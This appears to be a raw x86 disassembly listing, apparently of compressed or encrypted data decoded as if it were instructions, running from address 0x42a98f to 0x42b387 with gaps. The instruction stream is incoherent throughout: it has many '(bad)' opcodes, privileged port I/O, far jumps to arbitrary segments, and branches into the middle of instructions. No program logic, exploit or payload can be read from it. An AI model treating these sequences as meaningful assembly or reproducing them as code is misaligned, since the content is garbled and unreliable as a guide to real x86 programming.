  42a98f:	lock xor al,0x0
	...
  42a9f2:	add    BYTE PTR [eax],al
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	mov    dh,0xa3
  42aa02:	add    BYTE PTR [esi+edx*4],0xc8
  42aa06:	add    DWORD PTR [eax],eax
  42aa08:	add    eax,0x98000001
  42aa0d:	mov    edx,0xb302befc
  42aa12:	fdivr  DWORD PTR [edx*2+0x2e14406b]
  42aa19:	out    dx,eax
  42aa1a:	jbe    0x42a9b5
  42aa1c:	xchg   edi,eax
  42aa1d:	test   BYTE PTR [ebp-0x7f5c7028],cl
  42aa23:	cmp    dl,dh
  42aa25:	jmp    0x42aa69
  42aa27:	cmp    esi,ecx
  42aa29:	adc    al,0xb2
  42aa2b:	ins    BYTE PTR es:[edi],dx
  42aa2c:	dec    esp
  42aa2d:	bnd jnp 0x42aa42
  42aa30:	dec    edx
  42aa31:	mov    al,0x30
  42aa33:	sbb    eax,0xc70dff65
  42aa38:	sahf   
  42aa39:	xor    ebp,0x63976820
  42aa3f:	stc    
  42aa40:	loop   0x42aab8
  42aa42:	dec    edi
  42aa43:	pop    es
  42aa44:	sub    al,0x58
  42aa46:	in     eax,0x49
  42aa48:	aad    0xb
  42aa4a:	int3   
  42aa4b:	int3   
  42aa4c:	(bad)  [esp+edx*2+0x36]
  42aa50:	cmp    BYTE PTR [eax],dh
  42aa52:	push   ds
  42aa53:	int    0xa3
  42aa55:	sbb    DWORD PTR [ecx+0x2d],ecx
  42aa58:	xor    DWORD PTR [esi],edi
  42aa5a:	inc    esi
  42aa5b:	push   cs
  42aa5c:	or     eax,DWORD PTR [ebx-0x2c]
  42aa5f:	nop
  42aa60:	pop    ebx
  42aa61:	retf   0xb64f
  42aa64:	lods   al,BYTE PTR ds:[esi]
  42aa65:	inc    edx
  42aa66:	pop    esp
  42aa67:	cmp    BYTE PTR [ecx-0x16518592],cl
  42aa6d:	test   BYTE PTR [esi+edi*4-0x57],ah
  42aa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa72:	jmp    0x42aa81
  42aa74:	icebp  
  42aa75:	int3   
  42aa76:	mov    ds:0xe8d15b74,eax
  42aa7b:	(bad)  
  42aa7c:	mov    al,ds:0x3ee234fc
  42aa81:	mov    DWORD PTR [esi+0x2411b097],esi
  42aa87:	inc    esi
  42aa88:	push   ss
  42aa89:	js     0x42aab5
  42aa8b:	fsub   st,st(7)
  42aa8d:	and    cl,cl
  42aa8f:	popf   
  42aa90:	add    eax,0xfd59e486
  42aa95:	into   
  42aa96:	cwde   
  42aa97:	mov    al,0xb7
  42aa99:	data16 into 
  42aa9b:	mov    dh,0xa2
  42aa9d:	int3   
  42aa9e:	sbb    eax,0xbc835200
  42aaa3:	and    BYTE PTR [edx+0x1410d309],cl
  42aaa9:	ror    ebp,cl
  42aaab:	test   bh,al
  42aaad:	or     ch,dl
  42aaaf:	mov    DWORD PTR [esi],ebx
  42aab1:	push   edx
  42aab2:	les    ebx,FWORD PTR [ecx-0x74]
  42aab5:	xchg   dh,dh
  42aab7:	dec    esi
  42aab8:	or     esp,ebp
  42aaba:	fild   DWORD PTR [esi-0x5]
  42aabd:	mov    esi,cs
  42aabf:	jl     0x42aa52
  42aac1:	jo     0x42aaa6
  42aac3:	lahf   
  42aac4:	sbb    eax,0x8360f31f
  42aac9:	ds enter 0xf777,0x56
  42aace:	(bad)  
  42aacf:	jg     0x42aa96
  42aad1:	gs push ss
  42aad3:	jp     0x42aade
  42aad5:	addr16 int 0x20
  42aad8:	outs   dx,BYTE PTR ds:[esi]
  42aad9:	push   edx
  42aada:	or     ecx,DWORD PTR [edi-0x339deb0c]
  42aae0:	sti    
  42aae1:	ins    DWORD PTR es:[edi],dx
  42aae2:	xchg   esi,eax
  42aae3:	mov    ds:0x4ff520a,eax
  42aae8:	cmp    eax,0xdf77e292
  42aaed:	daa    
  42aaee:	xor    DWORD PTR [edi+0x2c],0xc5bf47be
  42aaf5:	pop    DWORD PTR [edx]
  42aaf7:	call   0xc4bc:0xf477a3ae
  42aafe:	dec    ebp
  42aaff:	out    0x30,al
  42ab01:	mov    dl,0xe0
  42ab03:	das    
  42ab04:	and    DWORD PTR [ebx+ebp*1-0x5d95bb9],0xffffffe5
  42ab0c:	sub    edi,DWORD PTR [esp+ecx*1]
  42ab0f:	outs   dx,BYTE PTR ds:[esi]
  42ab10:	cmp    eax,0x0
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab81:	mov    eax,ds:0xc99bf126
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0x51000001
  42ab8d:	sahf   
  42ab8e:	or     esp,DWORD PTR [esi-0x66012029]
  42ab94:	daa    
  42ab95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab96:	xchg   DWORD PTR [edx+edx*8],esi
  42ab99:	push   esi
  42ab9a:	pop    esi
  42ab9b:	fbstp  TBYTE PTR [esi+0x2c413832]
  42aba1:	(bad)  
  42aba2:	cmp    ecx,DWORD PTR [ebx+0x69726bcb]
  42aba8:	push   0xfffffff5
  42abaa:	ins    BYTE PTR es:[edi],dx
  42abab:	leave  
  42abac:	or     DWORD PTR [ebp+0x5f],esp
  42abaf:	push   esi
  42abb0:	add    eax,0x26d52d3b
  42abb5:	mov    WORD PTR es:[ebx-0x27],ss
  42abb9:	or     eax,0x436dd097
  42abbe:	push   0x5929846c
  42abc3:	push   ebx
  42abc4:	push   0x5c
  42abc6:	fsubr  QWORD PTR [ebp+0x77]
  42abc9:	cwde   
  42abca:	xchg   ebx,eax
  42abcb:	fucomip st,st(4)
  42abcd:	pop    ebx
  42abce:	sbb    dl,BYTE PTR [edx]
  42abd0:	pusha  
  42abd1:	mov    ebp,0x1ec90189
  42abd6:	test   eax,esi
  42abd8:	sub    DWORD PTR [ecx+ebx*8-0x3c],ebx
  42abdc:	jo     0x42abf5
  42abde:	das    
  42abdf:	sub    al,0x1e
  42abe1:	stc    
  42abe2:	push   ebx
  42abe3:	and    DWORD PTR [esi-0x6f],edx
  42abe6:	fidivr WORD PTR [eax+0x26]
  42abe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abea:	pop    ebp
  42abeb:	mov    ch,0x18
  42abed:	fdivr  st,st(1)
  42abef:	or     al,0xe
  42abf1:	pop    esp
  42abf2:	mov    eax,ds:0x880621ef
  42abf7:	or     al,0x52
  42abf9:	xor    eax,0xb6ebbc3
  42abfe:	jmp    FWORD PTR [edx-0x3b]
  42ac01:	call   0x691adc9b
  42ac06:	fcmovnbe st,st(5)
  42ac08:	mov    edi,0x773b9683
  42ac0d:	sbb    eax,0x238c15c1
  42ac12:	sub    BYTE PTR [edx-0x1c],ch
  42ac15:	out    0x8c,eax
  42ac17:	add    ebp,eax
  42ac19:	xchg   ebx,eax
  42ac1a:	sbb    bl,cl
  42ac1c:	mov    dh,BYTE PTR [eax+0x4bd8c30b]
  42ac22:	sbb    eax,0x23f28781
  42ac27:	sbb    ah,al
  42ac29:	sub    dl,dh
  42ac2b:	fcmovnbe st,st(1)
  42ac2d:	mov    es,WORD PTR [eax+0x10d08e96]
  42ac33:	fnsave [eax+0x66d19296]
  42ac39:	leave  
  42ac3a:	shl    DWORD PTR [esi-0x3aa83942],0x9c
  42ac41:	mov    ah,0x7e
  42ac43:	jnp    0x42ac55
  42ac45:	pop    es
  42ac46:	cld    
  42ac47:	add    BYTE PTR [edi+0x51],dl
  42ac4a:	ins    DWORD PTR es:[edi],dx
  42ac4b:	retf   
  42ac4c:	dec    edi
  42ac4d:	test   BYTE PTR [ecx-0x14ea00ec],dh
  42ac53:	xor    eax,0x1eb3bdd
  42ac58:	fucomp st(3)
  42ac5a:	popf   
  42ac5b:	cs stos BYTE PTR es:[edi],al
  42ac5d:	daa    
  42ac5e:	ret    0x3eb4
  42ac61:	jbe    0x42ac4e
  42ac63:	jmp    0xc404da90
  42ac68:	out    0x71,eax
  42ac6a:	das    
  42ac6b:	mov    edx,0x96a93ce5
  42ac70:	sub    al,0x5c
  42ac72:	and    al,0xf0
  42ac74:	fistp  DWORD PTR [eax+ebp*1-0x39]
  42ac78:	add    DWORD PTR [edx],0x51a329aa
  42ac7e:	sub    BYTE PTR [ebp+0x6d547515],ch
  42ac84:	mov    ecx,ss
  42ac86:	aam    0xc6
  42ac88:	xchg   ebp,eax
  42ac89:	fwait
  42ac8a:	test   eax,0x897e082e
  42ac8f:	in     al,0xa
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	(bad)  
  42ad01:	xor    BYTE PTR [ebx+edx*1-0x60],bh
  42ad05:	retf   0x1
  42ad08:	add    eax,0xc2000001
  42ad0d:	inc    ebp
  42ad0e:	fbstp  TBYTE PTR [ebp+0x52]
  42ad11:	mov    eax,ds:0x9ee61b0b
  42ad16:	jmp    0xe441:0x7e714e25
  42ad1d:	lods   al,BYTE PTR ds:[esi]
  42ad1e:	std    
  42ad1f:	adc    ch,bh
  42ad21:	inc    ebp
  42ad22:	xor    eax,0xa357b430
  42ad27:	mov    BYTE PTR [ebx-0x62],ch
  42ad2a:	mov    ecx,0x299406e2
  42ad2f:	addr16 add esi,edi
  42ad32:	mov    DWORD PTR [ebx+ebp*4],ebp
  42ad35:	mul    ebp
  42ad37:	jbe    0x42adb6
  42ad39:	je     0x42ad91
  42ad3b:	fwait
  42ad3c:	(bad)  
  42ad3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad3e:	fmul   DWORD PTR [edx-0x67]
  42ad41:	push   ds
  42ad42:	cli    
  42ad43:	loop   0x42ad6b
  42ad45:	imul   edx,DWORD PTR [ebx-0x11],0x37045c12
  42ad4c:	cld    
  42ad4d:	out    0x47,eax
  42ad4f:	jne    0x42ad0b
  42ad51:	in     al,0xb
  42ad53:	repz shr DWORD PTR [ecx-0x7c],1
  42ad57:	aad    0x83
  42ad59:	mov    ah,BYTE PTR [ebp+0x57]
  42ad5c:	inc    ebp
  42ad5d:	xchg   ebx,eax
  42ad5e:	xor    al,0x4e
  42ad60:	stos   DWORD PTR es:[edi],eax
  42ad61:	fld    TBYTE PTR [edx]
  42ad63:	inc    ecx
  42ad64:	sub    al,BYTE PTR [ebx+0xe]
  42ad67:	nop
  42ad68:	inc    edi
  42ad69:	sahf   
  42ad6a:	retf   
  42ad6b:	fisttp QWORD PTR [edx+eiz*2-0x46]
  42ad6f:	fwait
  42ad70:	stos   DWORD PTR es:[edi],eax
  42ad71:	add    ah,0x14
  42ad74:	jo     0x42adbc
  42ad76:	repz scas al,BYTE PTR es:[edi]
  42ad78:	xchg   edi,eax
  42ad79:	jns    0x42ad75
  42ad7b:	push   esi
  42ad7c:	jne    0x42ad92
  42ad7e:	or     ch,bh
  42ad80:	pop    ebx
  42ad81:	aaa    
  42ad82:	mov    eax,0x9ee2d66b
  42ad87:	es push edi
  42ad89:	dec    ebp
  42ad8a:	into   
  42ad8b:	inc    edx
  42ad8c:	int    0x13
  42ad8e:	imul   esp,DWORD PTR [ecx],0xffffffbf
  42ad91:	pushf  
  42ad92:	js     0x42ad37
  42ad94:	sbb    al,0x62
  42ad96:	mov    edx,0x8b4cd4de
  42ad9b:	fcom   QWORD PTR [eax+ebp*8]
  42ad9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad9f:	mov    BYTE PTR [esp+eax*8-0x7b],al
  42ada3:	hlt    
  42ada4:	add    edx,DWORD PTR [ecx]
  42ada6:	je     0x42ad74
  42ada8:	mov    ecx,0xd7341155
  42adad:	ret    
  42adae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adaf:	push   esi
  42adb0:	sbb    eax,0xab0afe9e
  42adb5:	aam    0x52
  42adb7:	shr    BYTE PTR [eax-0x56006d68],1
  42adbd:	cli    
  42adbe:	cmc    
  42adbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42adc0:	mov    al,ds:0xb9d3556f
  42adc5:	sti    
  42adc6:	inc    esi
  42adc7:	arpl   WORD PTR [eax+0x8],ax
  42adca:	sub    DWORD PTR [esp+esi*1+0x5e],edi
  42adce:	repz sub dh,BYTE PTR [esi]
  42add1:	jmp    0x42ad88
  42add3:	pop    ebp
  42add4:	dec    ebp
  42add5:	fst    DWORD PTR [ecx+0x16e5f68]
  42addb:	inc    ebx
  42addc:	les    esp,FWORD PTR [ebx]
  42adde:	jno    0x42ad7e
  42ade0:	clc    
  42ade1:	retf   0xcbea
  42ade4:	leave  
  42ade5:	or     eax,0x29de2f61
  42adea:	imul   esp,DWORD PTR [eax-0x35840f61],0x6006290d
  42adf4:	mov    dl,0xe1
  42adf6:	les    edx,FWORD PTR [edi-0x1236655]
  42adfc:	js     0x42ae01
  42adfe:	xchg   esi,eax
  42adff:	lea    edi,[eax+eax*4-0x563e81dc]
  42ae06:	push   0x219adf72
  42ae0b:	and    ah,bl
  42ae0d:	(bad)  
  42ae0e:	(bad)  [eax+0x28]
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	test   BYTE PTR ds:0xcba5b8bb,dl
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0x1e000001
  42ae8d:	xor    cl,dl
  42ae8f:	(bad)  
  42ae90:	cmp    al,0x6e
  42ae92:	cmc    
  42ae93:	je     0x42ae63
  42ae95:	add    DWORD PTR [ebx+0x92e8741],esp
  42ae9b:	dec    eax
  42ae9c:	xchg   esp,eax
  42ae9d:	fbld   TBYTE PTR [edx-0x22234680]
  42aea3:	sub    DWORD PTR [ecx-0x73023b62],esi
  42aea9:	pop    eax
  42aeaa:	stos   DWORD PTR es:[edi],eax
  42aeab:	ret    0x3688
  42aeae:	arpl   WORD PTR [edi-0x13],dx
  42aeb1:	push   es
  42aeb2:	(bad)  
  42aeb3:	loopne 0x42ae70
  42aeb5:	cli    
  42aeb6:	cld    
  42aeb7:	push   esi
  42aeb8:	popa   
  42aeb9:	pop    edx
  42aeba:	add    al,0x31
  42aebc:	aam    0xa4
  42aebe:	mov    bh,0x6d
  42aec0:	fild   WORD PTR [edx+edi*1-0x39]
  42aec4:	pusha  
  42aec5:	inc    ebp
  42aec6:	xor    al,0xdf
  42aec8:	add    al,0x91
  42aeca:	mov    ch,0xbf
  42aecc:	int    0xff
  42aece:	repnz mov ah,0x35
  42aed1:	xor    ah,BYTE PTR [esi+0x49f74f3]
  42aed7:	test   eax,0xbda2f750
  42aedc:	inc    esi
  42aedd:	call   FWORD PTR [edi+0x48ba98f2]
  42aee3:	int3   
  42aee4:	out    0x2e,eax
  42aee6:	inc    eax
  42aee7:	clc    
  42aee8:	cmp    BYTE PTR [edi-0xd03772b],cl
  42aeee:	xchg   ecx,eax
  42aeef:	nop
  42aef0:	jge    0x42ae9e
  42aef2:	call   0xeb9bed28
  42aef7:	dec    ecx
  42aef8:	ret    0x122
  42aefb:	xchg   ecx,eax
  42aefc:	ror    DWORD PTR [edi-0x75],0x85
  42af00:	call   0xd4a66f9
  42af05:	(bad)  
  42af06:	push   ebx
  42af07:	in     eax,dx
  42af08:	out    0xb9,al
  42af0a:	adc    eax,0x14201744
  42af0f:	iret   
  42af10:	ret    
  42af11:	ret    
  42af12:	mov    WORD PTR [ebp-0x24],es
  42af15:	pop    esp
  42af16:	xchg   ecx,eax
  42af17:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42af19:	add    al,0xbb
  42af1b:	cmc    
  42af1c:	cwde   
  42af1d:	xor    esi,DWORD PTR [esi-0x621394a2]
  42af23:	mov    ecx,0xd619a3f5
  42af28:	les    eax,FWORD PTR [eax+0x46]
  42af2b:	repz and DWORD PTR [eax+0x2b],esp
  42af2f:	inc    ecx
  42af30:	(bad)  
  42af31:	(bad)  
  42af32:	jno    0x42af15
  42af34:	jnp    0x42afa6
  42af36:	jo     0x42af16
  42af38:	loop   0x42aedb
  42af3a:	adc    al,0xaf
  42af3c:	mov    edx,0xbdb9161e
  42af41:	xor    dl,BYTE PTR [eax-0x3]
  42af44:	fs loope 0x42af0c
  42af47:	dec    esi
  42af48:	xchg   esi,eax
  42af49:	mov    al,ds:0x421617df
  42af4e:	ds in  al,0x82
  42af51:	clc    
  42af52:	popf   
  42af53:	or     al,BYTE PTR [edi]
  42af55:	jmp    0x6c17:0x124ae550
  42af5c:	xchg   BYTE PTR [eax],bl
  42af5e:	xchg   esp,ecx
  42af60:	aam    0xab
  42af62:	or     al,0x65
  42af64:	mov    ds:0x43be6bfc,eax
  42af69:	xor    esi,DWORD PTR [esi+0x21]
  42af6c:	pop    esi
  42af6d:	lods   al,BYTE PTR ds:[esi]
  42af6e:	inc    edi
  42af6f:	push   edx
  42af70:	xchg   dl,bl
  42af72:	cli    
  42af73:	push   eax
  42af74:	cmp    bh,BYTE PTR [eax]
  42af76:	push   ss
  42af77:	test   DWORD PTR [ebx+0x5e],0x81e61467
  42af7e:	inc    esi
  42af7f:	xchg   ecx,eax
  42af80:	test   eax,0x4687c9a
  42af85:	xor    BYTE PTR [ebp-0x1f9ea681],ah
  42af8b:	sub    al,BYTE PTR [esi+0x7d]
  42af8e:	pop    ecx
  42af8f:	fwait
  42af90:	sub    al,BYTE PTR [eax]
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	ret    
  42b001:	hlt    
  42b002:	xlat   BYTE PTR ds:[ebx]
  42b003:	inc    ebx
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0xa1000001
  42b00d:	jb     0x42b059
  42b00f:	(bad)  
  42b011:	cmp    BYTE PTR [ecx],ch
  42b013:	add    bl,bl
  42b015:	lock pop ebp
  42b017:	call   0xc736:0xfe3a36d5
  42b01e:	ss retf 0x8fd6
  42b022:	mov    al,ds:0x1fde7c11
  42b027:	into   
  42b028:	shl    ah,cl
  42b02a:	xor    al,0x54
  42b02c:	jge    0x42b04d
  42b02e:	adc    ebp,ecx
  42b030:	or     al,0x2a
  42b032:	dec    esi
  42b033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b034:	pusha  
  42b035:	xor    BYTE PTR [bp+0x5c90],al
  42b03a:	sub    ecx,DWORD PTR cs:[edx]
  42b03d:	jle    0x42afe1
  42b03f:	int3   
  42b040:	cmp    edi,esi
  42b042:	lods   eax,DWORD PTR ds:[esi]
  42b043:	jo     0x42b055
  42b045:	mov    dh,0x92
  42b047:	test   bh,al
  42b049:	sar    DWORD PTR [esi+0x64670def],0x92
  42b050:	ins    BYTE PTR es:[edi],dx
  42b051:	dec    ebx
  42b052:	sbb    BYTE PTR [eax],0xfc
  42b055:	jl     0x42b05c
  42b057:	stos   DWORD PTR es:[edi],eax
  42b058:	leave  
  42b059:	jmp    0xdfe6:0x4d2dda93
  42b060:	in     eax,dx
  42b061:	sub    ch,dh
  42b063:	xlat   BYTE PTR ds:[ebx]
  42b064:	inc    ebp
  42b065:	inc    esp
  42b066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b067:	retf   
  42b068:	rcl    BYTE PTR [ebp-0x52],cl
  42b06b:	cdq    
  42b06c:	loopne 0x42b0c3
  42b06e:	ror    DWORD PTR [edx+0x2d637696],0x22
  42b075:	in     eax,dx
  42b076:	imul   edx,DWORD PTR [ebp+eax*4+0x4bef2a9d],0xffffffb7
  42b07e:	dec    BYTE PTR [edi+ebp*1+0x1d]
  42b082:	adc    BYTE PTR [eax+0x31],cl
  42b085:	lds    esp,FWORD PTR [ebp-0x34]
  42b088:	pop    es
  42b089:	es adc eax,ecx
  42b08c:	mov    ch,0x19
  42b08e:	hlt    
  42b08f:	retf   
  42b090:	inc    ebx
  42b091:	mov    gs,ecx
  42b093:	pop    esi
  42b094:	out    dx,eax
  42b095:	dec    ecx
  42b096:	cmp    ecx,esp
  42b098:	clc    
  42b099:	adc    al,0x6e
  42b09b:	cmc    
  42b09c:	aas    
  42b09d:	dec    edi
  42b09e:	mov    dh,0xae
  42b0a0:	inc    ecx
  42b0a1:	inc    ebx
  42b0a2:	or     al,0x51
  42b0a4:	and    al,0x88
  42b0a6:	jb     0x42b048
  42b0a8:	test   bl,0xf3
  42b0ab:	and    ch,ah
  42b0ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0ae:	inc    cl
  42b0b0:	mov    edx,0x8822630b
  42b0b5:	mov    al,0x15
  42b0b7:	push   0x41
  42b0b9:	cs pop eax
  42b0bb:	xchg   ebx,eax
  42b0bc:	ins    BYTE PTR es:[edi],dx
  42b0bd:	cmp    ch,ah
  42b0bf:	jecxz  0x42b0f1
  42b0c1:	es dec edi
  42b0c3:	sbb    eax,0xcb650b0b
  42b0c8:	icebp  
  42b0c9:	out    0x1d,al
  42b0cb:	sar    DWORD PTR [edx+0x4bb46a92],1
  42b0d1:	cli    
  42b0d2:	sub    DWORD PTR [esp+eiz*8+0x740f4bec],edx
  42b0d9:	inc    ebx
  42b0da:	pop    ebp
  42b0db:	add    DWORD PTR [ebx+esi*2+0x60c507ac],ecx
  42b0e2:	push   0xffffffe3
  42b0e4:	sti    
  42b0e5:	fistp  QWORD PTR [eax]
  42b0e7:	xchg   esi,eax
  42b0e8:	(bad)  
  42b0e9:	je     0x42b128
  42b0eb:	outs   dx,DWORD PTR ds:[esi]
  42b0ec:	shl    bh,cl
  42b0ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0ef:	aas    
  42b0f0:	or     eax,0x761ce082
  42b0f5:	sti    
  42b0f6:	lea    edx,ds:0x22634091
  42b0fc:	ds push es
  42b0fe:	jp     0x42b092
  42b100:	mov    ebx,gs
  42b102:	out    0x9f,eax
  42b104:	lods   eax,DWORD PTR ds:[esi]
  42b105:	push   ds
  42b106:	pop    es
  42b107:	pop    eax
  42b108:	xchg   ebx,eax
  42b109:	cmp    eax,0x15aecc07
  42b10e:	sub    BYTE PTR [edx+0xa3],al
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	push   ss
  42b181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b182:	repnz stos DWORD PTR es:[edi],eax
  42b184:	scas   eax,DWORD PTR es:[edi]
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0xa7000001,al
  42b18d:	mov    ds:0xee135bc3,al
  42b192:	pop    es
  42b193:	inc    ebp
  42b194:	ja     0x42b182
  42b196:	adc    ecx,edx
  42b198:	add    esi,DWORD PTR [esi+0x7d87926c]
  42b19e:	and    BYTE PTR [esi-0x64],dh
  42b1a1:	cmp    dl,BYTE PTR [ecx-0x6a]
  42b1a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1a5:	retf   0x7b5a
  42b1a8:	jbe    0x42b218
  42b1aa:	inc    ecx
  42b1ab:	leave  
  42b1ac:	or     bh,ah
  42b1ae:	das    
  42b1af:	nop
  42b1b0:	ret    
  42b1b1:	out    0x8e,eax
  42b1b3:	in     al,dx
  42b1b4:	loopne 0x42b142
  42b1b6:	jmp    0x92:0xeabb
  42b1bc:	lock aaa 
  42b1be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1bf:	les    ebp,FWORD PTR [ebx+0x27]
  42b1c2:	xchg   edi,eax
  42b1c3:	push   ss
  42b1c4:	mov    eax,0x95c27f0b
  42b1c9:	adc    edx,ebp
  42b1cb:	das    
  42b1cc:	xor    DWORD PTR [edi+esi*4+0x3c],0xffffffee
  42b1d1:	mov    cl,0xc4
  42b1d3:	ss (bad) 
  42b1d5:	push   ecx
  42b1d6:	xchg   ecx,eax
  42b1d7:	rcl    BYTE PTR [edi+0x575f3f0c],cl
  42b1dd:	mov    gs,WORD PTR [esi+0x2]
  42b1e0:	fcom   DWORD PTR [esi+0x5d]
  42b1e3:	out    dx,al
  42b1e4:	adc    eax,0xe415801e
  42b1e9:	xor    BYTE PTR ds:0x5ae5d34,cl
  42b1ef:	xchg   ecx,eax
  42b1f0:	pop    es
  42b1f1:	push   0x1790e016
  42b1f6:	xlat   BYTE PTR ds:[ebx]
  42b1f7:	or     esp,DWORD PTR [ecx+0x6f036922]
  42b1fd:	clc    
  42b1fe:	aam    0x77
  42b200:	mov    esp,0x8ac24e87
  42b205:	aaa    
  42b206:	mov    eax,0x6de2f943
  42b20b:	nop
  42b20c:	cmc    
  42b20d:	aas    
  42b20e:	push   ss
  42b20f:	mov    ah,0xa2
  42b211:	nop
  42b212:	or     BYTE PTR [eax+0x1d],0xf9
  42b216:	sub    bh,BYTE PTR [esi]
  42b218:	fstp   DWORD PTR [esp+ecx*1]
  42b21b:	(bad)  
  42b21c:	jle    0x42b203
  42b21e:	aas    
  42b21f:	lahf   
  42b220:	test   eax,0xe4e7fff9
  42b225:	pushf  
  42b226:	jmp    0x9bd8944e
  42b22b:	jmp    0xe4ae:0x3970d6ff
  42b232:	lds    esi,FWORD PTR [edi-0x3]
  42b235:	or     al,0xbf
  42b237:	adc    edx,esp
  42b239:	mov    eax,ds:0x5fd3feea
  42b23e:	in     al,0x9a
  42b240:	inc    eax
  42b241:	fstp   TBYTE PTR [edx+0x4c]
  42b244:	fs std 
  42b246:	xchg   ecx,eax
  42b247:	jnp    0x42b27d
  42b249:	inc    edi
  42b24a:	fstp   TBYTE PTR [ecx-0x6136f963]
  42b250:	adc    bl,BYTE PTR [ebx]
  42b252:	mov    edi,0x39510567
  42b257:	sti    
  42b258:	and    BYTE PTR [eax+0x57e7c9d6],0x8c
  42b25f:	dec    esp
  42b260:	popf   
  42b261:	mov    esi,0x9413744b
  42b266:	call   0x9ca5:0x8dc9ad
  42b26d:	mov    BYTE PTR [ecx-0x62],ah
  42b270:	fdiv   st(2),st
  42b272:	dec    esi
  42b273:	pushf  
  42b274:	dec    ebx
  42b275:	and    al,bh
  42b277:	and    bl,ah
  42b279:	icebp  
  42b27a:	call   0xd90a2077
  42b27f:	jnp    0x42b271
  42b281:	setle  BYTE PTR [edi-0x3d]
  42b285:	outs   dx,DWORD PTR ds:[esi]
  42b286:	loope  0x42b28e
  42b288:	or     BYTE PTR [ebx+0x56],0xd2
  42b28c:	sub    edi,DWORD PTR [ebx+0x19]
  42b28f:	pcmpgtb mm0,QWORD PTR [eax]
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0xd738e65
  42b301:	push   ebx
  42b302:	loop   0x42b2bc
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0x24000001
  42b30d:	mov    bl,0x7d
  42b30f:	mov    ?,WORD PTR [ebp+0x51]
  42b312:	pop    ss
  42b313:	and    BYTE PTR [ebx+ebx*2-0x69dcd5e8],al
  42b31a:	out    0x36,al
  42b31c:	jmp    0xcd7c869
  42b321:	jns    0x42b336
  42b323:	xchg   ebx,eax
  42b324:	shr    BYTE PTR [esi+0x7a],0x83
  42b328:	jmp    0xc78d:0x5e2b88ea
  42b32f:	jo     0x42b376
  42b331:	jecxz  0x42b38f
  42b333:	int    0xd4
  42b335:	lahf   
  42b336:	lock ss nop
  42b339:	jo     0x42b348
  42b33b:	cmp    BYTE PTR [esi],ch
  42b33d:	ror    bl,1
  42b33f:	adc    al,0x81
  42b341:	inc    eax
  42b342:	shl    ch,1
  42b344:	dec    ebp
  42b345:	jo     0x42b320
  42b347:	adc    edi,ebx
  42b349:	mov    DWORD PTR [ecx+0x148012e1],edx
  42b34f:	or     al,0x77
  42b351:	fistp  WORD PTR [esi]
  42b353:	push   edi
  42b354:	lock mov al,0xe3
  42b357:	mov    bl,0x93
  42b359:	inc    esi
  42b35a:	std    
  42b35b:	inc    edx
  42b35c:	ret    
  42b35d:	sahf   
  42b35e:	mov    bh,0x95
  42b360:	sahf   
  42b361:	sbb    esi,DWORD PTR [ebp-0x36]
  42b364:	add    esi,esi
  42b366:	add    DWORD PTR [ecx],esi
  42b368:	test   eax,0x817855b5
  42b36d:	daa    
  42b36e:	fmul   DWORD PTR ds:0x397e56f7
  42b374:	out    dx,al
  42b375:	nop
  42b376:	pop    eax
  42b377:	xchg   edx,eax
  42b378:	fild   DWORD PTR ds:0xea9f10ed
  42b37e:	cmp    DWORD PTR [esi+0x8],edx
  42b381:	bound  esp,QWORD PTR [ecx-0x3d]
  42b384:	rol    DWORD PTR [ebx],1
  42b386:	dec    ebp
  42b387:	xor    eax,0x1aa4fdf4
